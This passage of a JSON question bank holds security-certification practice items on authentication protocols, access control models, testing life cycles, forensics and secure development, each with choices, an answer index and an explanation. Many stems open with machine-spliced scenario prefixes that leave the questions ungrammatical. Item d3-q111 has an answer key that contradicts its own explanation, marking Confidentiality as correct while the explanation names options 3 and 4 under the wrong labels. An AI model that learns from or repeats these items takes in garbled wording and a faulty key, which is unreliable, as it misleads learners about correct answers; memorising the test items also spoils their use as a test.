      "explanation": "Option 4 is correct for this case. Password Authentication Protocol (PAP) provides a means to transport the logon credentials from the client to the authentication server. It transmits usernames and passwords in cleartext. It offers no form of encryption and is the least secure method of authentication. Challenge Handshake Authentication Protocol (CHAP) performs authentication using a challenge-response dialogue that cannot be replayed. A challenge is a random number issued by the server which the client uses along with the password hash to compute the one-way function-derived response. CHAP also periodically reauthenticates the remote system throughout an established communication session to verify the persistent identity of the remote client. This activity is transparent to the user. However, since CHAP is based on MD5, it is no longer considered secure. A Microsoft customization named MS-CHAPv2 uses updated algorithms and is preferred over the original CHAP. Extensible Authentication Protocol (EAP) is a framework for authentication instead of an actual protocol. EAP allows customized authentication security solutions, such as supporting smartcards, tokens, and biometrics. EAP was originally designed for use over physically isolated channels and thus assumed secured pathways. Some EAP methods use encryption, but others do not. Over 40 EAP methods are defined, including LEAP, PEAP, EAP-SIM, EAP-FAST, EAP-MD5, EAP-POTP, EAP-TLS, and EAP-TTLS."
    },
    {
      "id": "d4-q104",
      "domain": "4. Communication and Network Security",
      "stem": "A security review team is evaluating whether at a multinational bank, which option attacks is best defended against in the IPv6 (Internet Protocol) network?",
      "choices": [
        "Shoulder Surfing",
        "Sniffing",
        "Phishing",
        "Denial of Service (DoS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case., Sniffing. IPSec encrypts the payload and protects the contents of the network transmission. Hence, if a sniffing attack is attempted on IPSec traffic, the intruder will only see the encrypted traffic, not the content."
    },
    {
      "id": "d4-q105",
      "domain": "4. Communication and Network Security",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, the Research and Development department has its network implemented separately as IPv6. However, the department needs to connect to the rest of the enterprise's network, which is implemented as IPv4. Which option devices will be used between the networks?",
      "choices": [
        "Gateway",
        "Router",
        "Switch",
        "Bridge"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. Gateway is a networking device that connects networks that are using different network protocols. It is a product that enables two dissimilar networks to communicate or interface with each other."
    },
    {
      "id": "d5-q105",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Every organization has multiple critical assets, and each has its own set of admin accounts. Based on the enterprise's Security Policy, each time the shared admin account is used, the password needs to be changed. Which option tools is used to manage such accounts?",
      "choices": [
        "Active Directory Credential Management",
        "Identity Management System",
        "Access Management System",
        "Privileged Access Management System"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Privileged Access Management (PAM) is an information security (infosec) mechanism that safeguards identities with special access or capabilities beyond regular users. PAM systems treat privileged accounts with extra care because of the risk they pose to the technology environment. For example, should the credentials of an administrator or service account fall into the wrong hands, it could lead to the compromise of the organization's systems and confidential data."
    },
    {
      "id": "d5-q106",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a post-incident lessons-learned meeting, at a logistics enterprise, during a recent Phishing attempt, the attackers successfully accessed one of the systems. As the next step, they plan to gain access to other systems and escalate their privileges. Which option terms best describes this activity?",
      "choices": [
        "Privilege Escalation",
        "Lateral Movement",
        "Privilege Creep",
        "Permission Aggregation"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Lateral movement refers to the techniques that a cyber-attacker uses after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets. After entering the network, the attacker maintains ongoing access by moving through the compromised environment and obtaining increased privileges using various tools. Privilege escalation (1) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Privilege creep (3) is the slow and often unsupervised process of unnecessary privileges and rights being granted to users and identities. These accounts, with privileges greater than may be necessary and documented, pose a grave risk to the enterprise. Permission Aggregation (4) is another term for Privilege creep."
    },
    {
      "id": "d5-q107",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "As part of organization risk governance, at a cloud SaaS company, the new Access Management system in your organization supports Just-in-Time provisioning. Which option is NOT a benefit of JIT?",
      "choices": [
        "Reduced Onboarding Time",
        "Reduced number of accounts",
        "Reduced number of entitlements",
        "Increased Security"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. The number of entitlements is generally independent of the Identity Solution, it is dependent on the end application which is managed by the Identity Solution. JIT provisioning is a method of automating user account creation. It is generally based on an SSO solution, such that, when a new user tries to log in to an authorized app for the first time they trigger the flow of information (that's needed to create their account) from the identity provider to the app. The benefits of JIT are Reduced Onboarding Time (1), Reduced number of Accounts (2), and Increased Security (4)."
    },
    {
      "id": "d5-q108",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "As part of organization risk governance, at a multinational bank, a user has been granted \"Top Secret\" clearance, which is the highest access that anyone can have. What is the best reason why they may not have access to a Top-Secret classified File?",
      "choices": [
        "The Top-Secret classified file requires additional access",
        "Hexagon does not follow Mandatory Access Control",
        "The Top-Secret classified file requires additional classification",
        "They do not have a valid Need to Know"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. They do not have a valid need to know. Mandatory Access Control (MAC) is a means of restricting access to system resources based on the sensitivity (as represented by a label) of the information contained in the system resource and the formal authorization (i.e., clearance) of users to access information of such sensitivity. The most likely reason that the user does not have access to the Top-Secret Classified file is that they do not have a valid Need-to-Know authorization to access the file. The concept of Need-to-Know states that a user shall only have access to the information that their job function requires, regardless of their security clearance level or other approvals."
    },
    {
      "id": "d5-q109",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "An organization has implemented Role-Based Access Control, what mechanism should they incorporate so that no one has access to initiate and approve a transaction?",
      "choices": [
        "Least privilege",
        "Separation of Duty",
        "Need to Know",
        "Mandatory Leave"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Separation of Duty is the principle that no user should be given enough privileges to misuse the system on their own. For example, the person authorizing a paycheck should not also be the one who can prepare them."
    },
    {
      "id": "d5-q110",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "As part of organization risk governance, at a healthcare provider, which option Access Control mechanisms authorizes a user dynamically?",
      "choices": [
        "Mandatory Access Control",
        "Discretionary Access Control",
        "Role-Based Access Control",
        "Attribute-Based Access Control"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Attribute-Based Access Control (ABAC) authorizes access dynamically based on the characteristics of both Subject and Object. By definition, ABAC is an access control method where subject requests to perform operations on objects are granted or denied based on the assigned attributes of the subject, assigned attributes of the object, environment conditions, and a set of policies that are specified in terms of those attributes and conditions. Other Access control mechanisms do not consider changes in Subject/Object attributes to authorize access."
    },
    {
      "id": "d5-q111",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Software Development organization has clearly defined user onboarding workflows that give every user base access to the enterprise's infrastructure, along with their specific department access. After onboarding, the user needs to request the required accesses based on their requirement, this needs to be approved. Which Access Control Model is this?",
      "choices": [
        "Role-Based Access Control",
        "Request-Based Access Control",
        "Attribute-Based Access Control",
        "Mandatory Access Control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The described scenario is a typical Role-Based Access Control where the users are provided with birthright access along with role-based accesses (department, location, etc). In typical Role-Based Access Control implementations, once provided with the birthright accesses, the user can request for the other roles which go through the approvals before being granted (Request Based Access Control)."
    },
    {
      "id": "d5-q112",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "While planning a control enhancement roadmap, at a telecom operator, during Annual Access Review, the Manager finds that consultants previously given temporary accesses still have these accesses. What next step could be taken by the manager?",
      "choices": [
        "Delegate the action to the Manager's Manager",
        "Approve the accesses of the consultants",
        "Revoke the accesses of the consultants",
        "Confirm existing user's need for the access before taking action"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Before taking any action, the Manager should connect with the team members (existing consultants) to determine whether they still require access or not. Based on the response, the Manager should take the appropriate action on whether to approve or revoke."
    },
    {
      "id": "d5-q113",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "As part of organization risk governance, at a cloud SaaS company, organization A performed the 3rd party audit for organization B and found that several application accounts were still active even though the associated identity had been terminated. What is the best control to handle this situation?",
      "choices": [
        "Closed loop automated application Integration with IAM system",
        "Periodic recertification of access",
        "Automated provisioning/de-provisioning of managed identities",
        "Role-based access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The most likely reason for unmanaged accounts on the end application is either the application is managed manually or partially. With Closed-loop automated application Integration, the IAM system manages all the accounts on the application. If anyone creates an unmanaged account on the application, via periodic sync, the IAM system will detect and manage (delete) the account on the application."
    },
    {
      "id": "d6-q109",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a post-incident lessons-learned meeting, at a logistics enterprise, order the following steps of the Software Testing Life Cycle in the correct order: A. Test Planning B. Requirement Analysis C. Test Execution D. Test Case Designing E. Test Closure F. Test Environment Setup?",
      "choices": [
        "B -> A -> F -> D - > C -> E",
        "B -> A -> D -> F - > C -> E",
        "B -> A -> D -> C - > F -> E",
        "B -> D -> A -> F - > C -> E"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. There are 6 major phases of STLC, which occur in the following order: Requirement Analysis: The SRD is ready and shared with the stakeholders, and the testing team starts a high-level analysis concerning the AUT (Application under Test). Test Planning Test: The Team plans the strategy and approach. Test Case Designing: Develop the test cases based on scope and criteria. Test Environment Setup: The integrated environment is ready to validate the product. Test Execution: Real-time validation of the product and finding bugs. Test Closure: Once testing is completed, the matrix, reports, and results are documented."
    },
    {
      "id": "d6-q110",
      "domain": "6. Security Assessment and Testing",
      "stem": "During an Internal Audit, several issues were found in your organization and the results have been presented to Senior Management. Which option decisions is least likely to be taken by Senior Management?",
      "choices": [
        "Discuss the recommendations with SMEs",
        "Take corrective action to fix the issues",
        "Update the Organization policies to make sure these issues are handled organization-wide",
        "Review the existing policies to find the gap"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. Fixing issues is not the responsibility of Senior Management; their first step is to review the Audit results and recommendations. This may involve reviewing the existing policies, standards, and procedures to identify the gaps and decide on the steps needed to handle the situation. Based on the recommendations, Risk Analysis needs to be done and the results need to be reviewed. In case of any change, Change Management procedures must be followed."
    },
    {
      "id": "d6-q111",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a post-incident lessons-learned meeting, at a telecom operator, a cloud-based SaaS service provider is working on a new SaaS application. At what stage must they involve the Penetration Testing Team?",
      "choices": [
        "During the Design Phase",
        "During the Testing Phase",
        "After Prod Release",
        "Before Prod release"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. In general, a pen test should be done right before a system is put into production, once the system is no longer in a state of constant change. A pen test is not a one-time task. Networks and computer systems are dynamic, meaning that they do not stay the same for very long."
    },
    {
      "id": "d6-q112",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a post-incident lessons-learned meeting, at a federal contractor, the sales department is adding a new API layer to their existing application Interface. This will allow other teams to fetch sales app data programmatically, within the enterprise. Which option testing types is least likely to be performed in this scenario?",
      "choices": [
        "Interface Testing",
        "Regression Testing",
        "Alpha Testing",
        "Beta Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Beta Testing is conducted at one or more customer sites by end-users of the software. This version is released for a limited number of users for testing in a real-time environment. In the described scenario, since the product is being used internally, Beta Testing is least likely to be done of the available options. Alpha Testing (3) is a type of validation testing. It is a type of acceptance testing which is done before the product is released to customers. It is typically done by QA people. Interface Testing (1) is defined as a software testing type that verifies whether the communication between two different software systems is done correctly. Since in the above scenario, a new interface is being developed, it is highly probable that Interface testing will be performed. Regression testing (2) is a software testing practice that ensures an application still functions as expected after any code changes, updates, or improvements. Regression testing is responsible for the overall stability and functionality of existing features. Since, in the above scenario, a new feature is being added, regression testing must be performed."
    },
    {
      "id": "d6-q113",
      "domain": "6. Security Assessment and Testing",
      "stem": "A security review team is evaluating whether at a federal contractor, during a recent attack, attackers exploited your corporation's newly launched application. The attackers exploited the buffer overflow vulnerability in the new system. Which option testing methodologies could have been missed?",
      "choices": [
        "User Acceptance Testing",
        "Use Case Testing",
        "System Integration Testing",
        "Misuse Case Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The Buffer Overflow attack is generally caused when the testing strategies do not include input validation or misuse case testing. Misuse case testing is a process used by software testers to evaluate the vulnerability of their software to known risks. Testers first enumerate the known misuse cases and then attempt to exploit those use cases with manual and/or automated attack techniques."
    },
    {
      "id": "d6-q114",
      "domain": "6. Security Assessment and Testing",
      "stem": "A security review team is evaluating whether at a cloud SaaS company, based on the enterprise's BCP, the administrator team backs up the critical Infrastructure every day as per the Security Policy. What is the best way to validate the backups?",
      "choices": [
        "Validate the Audit logs of the backup processes",
        "Make sure the backup hardware and storage infrastructure is protected",
        "Compare the data between the actual system and backups",
        "Restore systems from the backups"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. The best way to validate the backups is by occasionally restoring and testing the backups to ensure that the data is intact and has maintained its integrity."
    },
    {
      "id": "d6-q115",
      "domain": "6. Security Assessment and Testing",
      "stem": "A security review team is evaluating whether at a healthcare provider, during the feature testing of a Third Party vendor product that is used enterprise-wide, the testing team found an issue. Upon evaluation, it is found that it is an issue with the product. What is the best way to handle this issue?",
      "choices": [
        "Contact Vendor",
        "Involve the development team to fix the issue",
        "Since this is a security issue, contact the consumer court",
        "Evaluate alternative products"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The best way to handle and report the issue in the product is by reporting it to the Vendor. As per the principle of Ethical Disclosure, any vulnerability if found, should be reported to the vendor and they should be allowed sufficient time to fix the issue."
    },
    {
      "id": "d7-q111",
      "domain": "7. Security Operations",
      "stem": "In preparation for an external audit, at a cloud SaaS company, after a recent Digital Payments Server hack, law enforcement was involved to investigate the crime scene. The law enforcement team collected evidence from the affected systems. Following the evidence collection and handling best practices, from which of the following sources should data be collected first?",
      "choices": [
        "CPU Cache",
        "Hard Disk",
        "Virtual Memory",
        "Magnetic Tapes"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. In forensics, the order of volatility refers to the order in which you should collect evidence. Highly volatile data is easily lost, such as data in memory when you turn off a computer. The least volatile forms of data, such as printouts, are relatively permanent. First responders need to understand the order of volatility to ensure they protect any potential evidence. The most volatile data includes data in CPU registers, caches, and memory. It is lost when the computer is rebooted. Virtual memory (a swap file) is stored on a disk drive but is rebuilt when the computer is rebooted. Data on disk drives will stay there, often even after a user attempts to delete it. Backups on tapes and optical discs have a very low level of volatility. Similarly, remote logs have a very low level of volatility."
    },
    {
      "id": "d7-q112",
      "domain": "7. Security Operations",
      "stem": "Your enterprise's Security Administration Team recently installed an Intrusion Detection System (IDS) which will help the organization strengthen its attack detection capability. However, during its operation, the Administration Team encountered many false positives. Which option techniques works best to reduce the number of false positives?",
      "choices": [
        "Place the IDS after the DMZ that will warrant valid traffic",
        "Establish IDS policies to handle known false positives",
        "Keep the IDS updated with the most recent security patches",
        "Place the IDS behind the firewall"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. An improperly tuned IDS will generate an overwhelming number of false positives. Establishing a policy that removes known False Positives will save time in future investigations and prevent unwarranted escalations. An IDS is generally placed after the firewall. Placing the IDS in this location allows it to do its job on all traffic that gets through the edge firewall and provides an extra layer of protection for the DMZ. The DMZ is the most vulnerable part of your network since it contains your public servers such as Internet-accessible web servers, DNS servers, and front-end mail servers."
    },
    {
      "id": "d7-q113",
      "domain": "7. Security Operations",
      "stem": "While planning a control enhancement roadmap, at a healthcare provider, security Configuration Management Process is comprised of the following steps: 1. Controlling Configuration Changes 2. Planning 3. Identifying and Implementing Configurations 4. Monitoring Which option options specifies the correct sequence of the Security Configuration Management?",
      "choices": [
        "1 -> 2 -> 3 -> 4",
        "2 -> 3 -> 1 -> 4",
        "2 -> 1-> 3 -> 4",
        "3 -> 2-> 1 -> 4"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. As per the NIST SP 800-128, security-focused configuration management of systems involves a set of activities that can be organized into four major phases: Planning -> Identifying and Implementing Configurations -> Controlling Configuration Changes -> Monitoring"
    },
    {
      "id": "d7-q114",
      "domain": "7. Security Operations",
      "stem": "While planning a control enhancement roadmap, at a healthcare provider, amina, a trainee, found a shining USB pen drive in the common public area in front of the office compound. Intrigued, she connected the pen drive to her office laptop which led to the automatic installation of malware. Which option approaches would be the best protection against this scenario?",
      "choices": [
        "Antimalware Software",
        "Employee security awareness training",
        "Blocking USB devices",
        "Scanning employees every time they enter the building"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. In the described scenario, employee security awareness training is the most effective way to protect against this type of cyber threat by teaching employees not to insert untrusted removable media into their computers. If for some reason an employee needs to plug in the flash drive, then the organization should have a process to handle such a case (i.e., testing the USB drive in a sandbox environment for various malicious activities). Installation of Antimalware software is critical to handle the situation once the system gets affected; however, the first line of defense is employee awareness training followed by other protection controls (defense in depth)."
    },
    {
      "id": "d7-q115",
      "domain": "7. Security Operations",
      "stem": "While planning a control enhancement roadmap, at a telecom operator, the Security Team advocated for a honeypot server in the recent meeting with Senior Management. What is the primary goal of implementing Honeypots?",
      "choices": [
        "Document violations",
        "Entice attackers",
        "Entrap attackers",
        "Challenge attackers"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The primary goal of implementing honeypots/honeynets is to understand the behavior of attacks and document any violations. This helps the security team be better prepared for any potential attacks. Entrapment refers to an illegal practice in which law enforcement persuades someone to commit a crime when the person otherwise had no intention to. Enticement refers to a practice in which law enforcement makes conditions for commission favorable, but the person is already determined to commit the crime. Challenging the attackers is never the goal of implementing Honeypot/Honeynet systems."
    },
    {
      "id": "d7-q116",
      "domain": "7. Security Operations",
      "stem": "During a post-incident lessons-learned meeting, at a multinational bank, aiko recently completed the ITIL Certification which advocates implementing the Change Management Process in the Enterprise. Arrange the following steps in the correct sequence of the Change Management Process. A. Documenting the changes. B. Testing the changes. C. Creating requests for changes. D. Reviewing requests for changes. E. Approve/Reject changes. F. Schedule and Implement changes. Select the correct sequence of steps from the given options:?",
      "choices": [
        "C -> D -> E -> B -> F -> A",
        "C -> D -> B -> E -> F -> A",
        "C -> D -> E -> F -> B -> A",
        "C -> E -> D -> B -> F -> A"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. ITIL change management is a process designed to understand and minimize risks while making IT changes. Businesses have two main expectations of the services provided by IT: the services should be stable, reliable, and predictable, and the services should be able to change rapidly to meet evolving business requirements. 1. Creating requests for changes (RFC) 2. Reviewing requests for changes. 3. Approving/Rejecting changes. 4. Testing changes. 5. Scheduling and Implementing changes. 6. Documenting changes."
    },
    {
      "id": "d8-q79",
      "domain": "8. Software Development Security",
      "stem": "Your organization has recently implemented the Software Assurance Maturity Model (SAMM) which provides a way to analyze and improve the secure development lifecycle. Which option features is not provided by SAMM?",
      "choices": [
        "Audit an organization's existing software development tools",
        "Build a balanced software security assurance program in well-defined iterations",
        "Demonstrate concrete improvements to a security assurance program",
        "Define and measure security-related activities throughout an organization"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct for this case. The Software Assurance Maturity Model (SAMM) is an open framework to help organizations formulate and implement a software security strategy tailored to specific risks the organization is facing. SAMM helps you: * Evaluate an organization's existing software security practices * Build a balanced software security assurance program in well-defined iterations (2) * Demonstrate concrete improvements to a security assurance program (3) * Define and measure security-related activities throughout an organization (4)"
    },
    {
      "id": "d8-q80",
      "domain": "8. Software Development Security",
      "stem": "A security review team is evaluating whether at a multinational bank, alpine Corp is a Business Software Solution development organization that follows the Agile model for implementing custom software solutions. Which option principles is least aligned to the Agile Model?",
      "choices": [
        "Business people and developers must work together daily throughout the project.",
        "Working software is the primary measure of progress.",
        "The art of minimizing the amount of work not done is essential.",
        "At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. Out of the given options, the principle of minimizing the amount of work not done is least aligned to the Agile model. On the contrary, in the Agile model the art of maximizing the work not done is essential. The following principles are based on the Agile Manifesto: • Our highest priority is to satisfy the customer through early and continuous delivery of valuable software. • Welcome changing requirements, even late in development. Agile processes harness change for the customer's competitive advantage. • Deliver working software frequently, from a couple of weeks to a couple of months, with a preference for the shorter timescale. • Business people and developers must work together daily throughout the project. • Build projects around motivated individuals. Give them the environment and support they need, and trust them to get the job done. • The most efficient and effective method of conveying information to and within a development team is face-to-face conversation. • Working software is the primary measure of progress. • Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely. • Continuous attention to technical excellence and good design enhances agility. • Simplicity – the art of maximizing the amount of work not done – is essential. • The best architectures, requirements, and designs emerge from self-organizing teams. • At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
    },
    {
      "id": "d8-q81",
      "domain": "8. Software Development Security",
      "stem": "As part of organization risk governance, at a healthcare provider, the security team wants to enhance Security Response capabilities such that they could automatically respond to many commonly occurring incidents. Which option options will they most likely consider?",
      "choices": [
        "SIEM",
        "UEBA",
        "SOAR",
        "EDR"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. SOAR (Security Orchestration, Automation, and Response) refers to a collection of software solutions and tools that allow organizations to streamline security operations. It enables organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies (where incident analysis and triage can be performed by leveraging a combination of human and machine power) help define, prioritize, and drive standardized incident response activities."
    },
    {
      "id": "d8-q82",
      "domain": "8. Software Development Security",
      "stem": "In preparation for an external audit, at a healthcare provider, your organization uses the COTS Identity Management Software. Recently the Vendor Support Team contacted your security team informing them that there is a security patch released by the vendor. They suggested you implement it. What is the next step your security team should perform?",
      "choices": [
        "Install the patch on your PROD env as this is a security issue",
        "Review the patch on your non-PROD env and do regression testing",
        "Review the patch changes and add them to the backlog to install them in the next available release",
        "Since this is a security patch, harden your enterprise ingress/egress points"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct for this case. In this situation, review the patch on your non-prod environment and do regression testing to validate if the existing features and functions of your IAM system work as intended. Once that is done, the Security Patch should be installed on the PPTE or other environments, and validation must be completed. Once everything is reviewed based on the change control process, the Security Patch must be applied to the PROD environment."
    },
    {
      "id": "d8-q83",
      "domain": "8. Software Development Security",
      "stem": "During a post-incident lessons-learned meeting, at a federal contractor, according to the OWASP Top 10 Web Application Vulnerabilities Report, Broken Access Control issues were found in 94% of applications. Which option controls is least effective against Broken Access Control?",
      "choices": [
        "Except for public resources, deny by default.",
        "Implement access control mechanisms once and re-use them throughout the application",
        "Log access control failures and alert admins when appropriate (e.g., repeated failures).",
        "Model access controls should be based on the user's right to perform operations like create, read, update, or delete any record."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Per the OWASP Top 10 Report, to handle Broken Access Control, we need to model access controls that should enforce record ownership rather than accepting that the user can create, read, update, or delete any record. Other Controls include: • Except for public resources, deny by default. • Implement access control mechanisms once and re-use them throughout the application, including minimizing Cross-Origin Resource Sharing (CORS) usage. • Unique application business limit requirements should be enforced by domain models. • Disable web server directory listing and ensure file metadata (e.g.,. git) and backup files are not present within web roots. • Log access control failures, and alert admins when appropriate (e.g., repeated failures). • Rate limit API and controller access to minimize the harm from automated attack tooling. • Stateful session identifiers should be invalidated on the server after logout."
    },
    {
      "id": "d3-q110",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In preparation for an external audit, at a cloud SaaS company, a software organization is planning to migrate some critical infrastructure to a cloud environment. As a security consultant, you have been tasked with finding a cost-effective solution that will help the organization offload hardware and patching requirements but keep control over its applications and data. What solution would you propose?",
      "choices": [
        "Private cloud - PaaS",
        "Public cloud - SaaS",
        "Community cloud - IaaS",
        "Public cloud - PaaS"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct for this case. Cloud service providers (CSP) mainly offer 4 types of cloud deployment models: a) Private cloud: Underlying infrastructure and resources are dedicated to a single organization. This model offers better performance and security but at a high cost. b) Community cloud: A similar group of organizations share the infrastructure and resources provided by the CSP. It is costlier than the public cloud but cheaper than a private cloud. c) Public cloud: Multiple organizations share the same underlying infrastructure and resources hosted by the CSP. It is a cost-effective model compared to private and community models. d) Hybrid cloud: A combination of two or more of the models described above. Each deployment model consists of different service models that define responsibilities between the vendor and the cloud provider a) Software As a Service (SaaS) – The CSP bears all the responsibilities of the infrastructure. Providing the application, maintaining the software with patches and hardware replacements. b) Infrastructure As a Service (IaaS) - The customer takes the responsibility of maintaining the application, securing the data, and patching the OS while the CSP retains the responsibility of providing Infrastructure services like networking, server infrastructure, and virtualization. c) Platform As a Service (PaaS) – This service model gives the organization complete control over the application and data while assigning the patching and hardware responsibility to the cloud vendor."
    },
    {
      "id": "d3-q111",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The CEO of the organization wants to send a secure message to a member of the board of directors (BOD). They create a digest of the message they want to send by running it through the hashing algorithm. They then encrypt the message digest with their private key and send the message, along with the encrypted digest, to the relevant member of the BOD. Which security principles/concepts are NOT upheld by this process? (Select TWO)?",
      "choices": [
        "Confidentiality",
        "Integrity",
        "Non-repudiation",
        "Availability"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. Neither confidentiality nor availability are upheld. The scenario described in the question implies the CEO used digital signatures to send a secure message to the board member. When a member of the BOD receives the plaintext message along with the encrypted message digest, they will decrypt the digest using the CEO's public key. This verifies that the message has come from the CEO (Authentication) and since it was encrypted with their private key, they cannot deny having sent that message later (non-repudiation). After decrypting the message digest, the member of the BOD will run the plaintext message through the same hashing algorithm and will compare the output hash value with the decrypted hash. If both the values match then the message was unaltered in transit (Integrity). Since the original message was sent in plain text, an attacker could easily read the message in transit. Therefore, it does not provide confidentiality. Digital signatures are not used to maintain system uptime or high availability, so it does not uphold availability either."
    },
    {
      "id": "d2-q88",
      "domain": "2. Asset Security",
      "stem": "As part of organization risk governance, at a multinational bank, a organization decides to outsource its configuration management program to a third-party vendor. They want to ensure that minimum security controls are configured on the newly imaged machines. What should the organization provide to the third-party vendor to ensure these requirements are met?",
      "choices": [
        "Policy document",
        "Best practice guidelines for system configuration",
        "Baseline configuration",
        "Procedure document"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. A baseline configuration is the minimum security that every system in the organization should have. This ensures that security controls are implemented consistently throughout the organization. More stringent controls can be implemented on top of the security baseline depending on the criticality of any given system. A policy (1) is a high-level document, approved by senior management, which does not specify security details. The best practice guidelines (2) are recommendations but are not mandatory. A procedure document (4) can be specific to a particular piece of software, or system, and it does not define the minimum security controls required."
    },
    {
      "id": "d8-q84",
      "domain": "8. Software Development Security",
      "stem": "A security review team is evaluating whether at a telecom operator, in the fast-paced gaming world, a organization wants to create a game and roll it out in the market as soon as possible. Their idea and requirements are well defined, and they believe a working prototype is more important than initial planning. They hire a group of developers and game testers. The developers create an initial gaming prototype and hand it over to the testers to find any bugs in the game by playing it in real-time. Based on the feedback, developers will fix the bugs and send the amended prototype back to the testers. The organization wants this process to continue until a final prototype is ready for roll-out. Which software development model is the organization using? And what application testing technique are the testers following?",
      "choices": [
        "The company is using a spiral model and the testers are using fuzzing techniques to test the game.",
        "The company is using the JAD model and the testers are using white-box techniques to test the game.",
        "The company is using the RAD model and the testers are using DAST techniques to test the game",
        "The company is using the TAD model and the testers are using SAST techniques to test the game"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct for this case. The company is using the RAD model and the testers are using DAST techniques to test the game. The Rapid Application Development (RAD) model is a software development process that is based on prototyping. It focuses on working prototypes instead of initial planning. This type of process is used when the objective is well-defined and narrow in nature. This is an iterative process and is often used to develop mobile applications. The testers are using dynamic application testing (DAST) techniques since they are evaluating the application in real time without having access to the source code. The Joint Application Development (JAD) model refers to the process in which the users/clients work directly with the software developers to create an application. These joint working sessions give a good understanding of the project requirements, which reduces the time spent in quality assurance and testing. There is no TAD model."
    },
    {
      "id": "d6-q116",
      "domain": "6. Security Assessment and Testing",
